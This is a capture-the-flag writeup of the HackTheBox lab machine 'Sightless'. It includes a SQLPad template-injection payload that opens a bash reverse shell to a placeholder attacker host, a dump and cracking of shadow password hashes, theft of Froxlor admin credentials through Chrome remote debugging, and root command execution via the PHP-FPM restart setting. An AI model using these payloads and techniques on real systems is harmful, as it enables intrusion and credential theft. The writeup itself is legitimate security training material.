---
title: Sightless Writeup
description: Writeup of "Sightless" machine from Hackthebox
categories: [Writeups, Hackthebox]
tags: [Hackthebox]
image:
  path: /assets/blogimages/Writeups/Hackthebox/Sightless/sightlessLOGO.png
  alt: Sightless Writeup
---

# Sightless(E)

## Foothold


We start with an `nmap` scan to identify open ports and services on the target:
```
nmap -Pn -A -p- 10.10.11.32 -v
```
```
PORT   STATE SERVICE VERSION
    21/tcp open  ftp
    | fingerprint-strings: 
    |   GenericLines: 
    |     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
    |     Invalid command: try being more creative
    |_    Invalid command: try being more creative
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
    |_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://sightless.htb/
```

The scan reveals FTP, SSH, and an HTTP service running. Exploring the HTTP service at `http://sightless.htb` shows the server is hosting **SQLPad**:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless1.png)

Clicking "Start Now" button leads to `sqlpad.sightless.htb` which to access I need to add it to `/etc/hosts`:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless2.png)

After adding `sqlpad.sightless.htb` to `/etc/hosts`, accessing it revealed the following interface:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless3.png)

Clicking the three dots in the top-right corner of the screen reveals an "About" button, which displays the **SQLPad** version information:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless4.png)


Searching for known vulnerabilities in this version led to a publicly disclosed exploit:
[https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb
](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

Based on this source I need to do few steps:
1. Navigate to **Connections -> Add Connection**.
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless5.png)![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless6.png)
2. Select  **MySQL** as the driver
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless7.png)
3. Enter the following payload in the **Database** field:

```
{% raw %}
{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/ATTACKERIP/ATTACKERPORT 0>&1"') }}
{% endraw %}
```


![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless8.png)

4. Start a listener on your machine `nc -lvnp 1234` and then click the "Test Connection" button in **SQLPad** to trigger the reverse shell:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless9.png)

Upon gaining a shell, the target appears to be running inside a Docker container, as evidenced by a `.dockerenv` file:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless10.png)


From the container, `/etc/shadow` revealed hashed passwords for `root` and `michael`:
```
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

Using `unshadow` and `hashcat`, the hashes were cracked:
```
unshadow passwd shadow > unshadowed
hashcat -m 1800 -a 0 unshadowed /usr/share/wordlists/rockyou.txt
```

```
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
```

Credentials obtained:
- **michael:** insaneclownposse
- **root:** blindside

Logging in via SSH as `michael` allowed retrieval of the user flag.

## Privilege Escalation

To identify potential privilege escalation vectors, I utilized `linpeas.sh`. The script was transferred to the target and made executable using the following commands:
```
scp /home/riminux/linpeas.sh michael@10.10.11.32:/tmp/linpeas.sh
chmod +x linpeas.sh
```

During the enumeration, I discovered some interesting processes related to Google Chrome:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless11.png)

Additionally, I used `ss -ltn` to identify any locally hosted services running on open ports:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless12.png)

One port of particular interest was `127.0.0.1:8080`, as port 8080 is commonly used for web applications. To investigate further, I executed the following command:
```
michael@sightless:/tmp$ curl 127.0.0.1:8080
```

```
<SNIP>
        <title>Froxlor</title>
</head>
<body id="app" class="min-vh-100 d-flex flex-column">

                        <div class="container-fluid">
                                <div class="container">
                <div class="row justify-content-center">
                        <form class="col-12 max-w-420 d-flex flex-column" method="post" enctype="application/x-www-form-urlencoded">
                                <img class="align-self-center my-5" src="templates/Froxlor/assets/img/logo.png" alt="Froxlor Server Management Panel"/>

                                <div class="card shadow">
                                        <div class="card-body">
                                                <h5 class="card-title">Login</h5>
                                                <p>Please log in to access your account.</p>


                                                <div class="mb-3">
                                                        <label for="loginname" class="col-form-label">Username</label>
                                                        <input class="form-control" type="text" name="loginname" id="loginname" value="" required autofocus/>
                                                </div>

                                                <div class="mb-3">
                                                        <label for="password" class="col-form-label">Password</label>
                                                        <input class="form-control" type="password" name="password" id="password" value="" required/>
                                                </div>
                                        </div>

                                        <div class="card-body d-grid gap-2">
                                                <button class="btn btn-primary" type="submit" name="dologin">Login</button>
                                        </div>

                                                                                        <div class="card-footer">
                                                        <a class="card-link text-body-secondary" href="index.php?action=forgotpwd">Forgot your password?</a>
                                                </div>
<SNIP>
```

The `curl` response indicated that the service on port 8080 was the Froxlor login page. To access it from my machine, I set up SSH port forwarding:
```
ssh -L 2222:localhost:8080 michael@10.10.11.32
```

I then visited `http://localhost:2222`, but it displayed a message stating that the domain was not configured
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless13.png)


To resolve this, I inspected the target's `/etc/hosts` file:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless14.png)


The file revealed the domain `admin.sightless.htb`, which I added to my local `/etc/hosts` file to properly route the request:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless15.png)


I connected to `http://admin.sightless.htb:2222` and was greeted with the Froxlor login page:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless16.png)

I tried several password combinations, but none were successful. However, I noted the presence of Google Chrome processes running on the target. This led me to consider leveraging these processes to potentially extract credentials, which might allow me to log in to Froxlor.

After researching online for potential exploits, I found this guide on exploiting Chrome's remote debugging feature:
[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

Based on this resource I followed the steps:
1. Using `ss -ltn` and `curl`, I probed ports until finding one associated with Chrome’s remote debugging that responded without errors:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless17.png)


2. I forwarded the debugging port to my local machine:
`ssh -L 45247:localhost:45247 michael@10.10.11.32`

3. On my local browser, I navigated to `chrome://inspect/#devices`:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless18.png)


4. I clicked "Configure..." and added `localhost:45247` to access the remote debugging interface:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless19.png)


5. Several debug targets appeared under "Remote Target." I selected one to inspect and opened the Network tab in Developer Tools:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless20.png)


6. In the "Network" tab, I clicked on `index.php`, inspected the payload, and discovered the Froxlor login credentials `admin:ForlorfroxAdmin`:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless21.png)


Using the extracted credentials, I logged in to Froxlor successfully:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless22.png)

I navigated to `PHP -> PHP-FPM Versions` and created a new "PHP version":
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless23.png)

I gave short description, made "process manager control" to **dynamic** and in "php-fpm restart command" I entered the command to copy the root flag: `cp /root/root.txt /tmp/rootwoah.txt`. Then I saved it:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless24.png)

I went to `System -> Settings -> PHP-FPM`, scrolled down, and clicked "Save." This action executed the restart command, copying the root flag to `/tmp`.

In `/tmp`, I confirmed the presence of the copied root flag:
![](/assets/blogimages/Writeups/Hackthebox/Sightless/sightless25.png)

To read the flag, I updated the PHP-FPM restart command to modify the permissions with `chmod 777 /tmp/rootwoah.txt` and after saving and re-executing the command, I was able to read the root flag successfully.
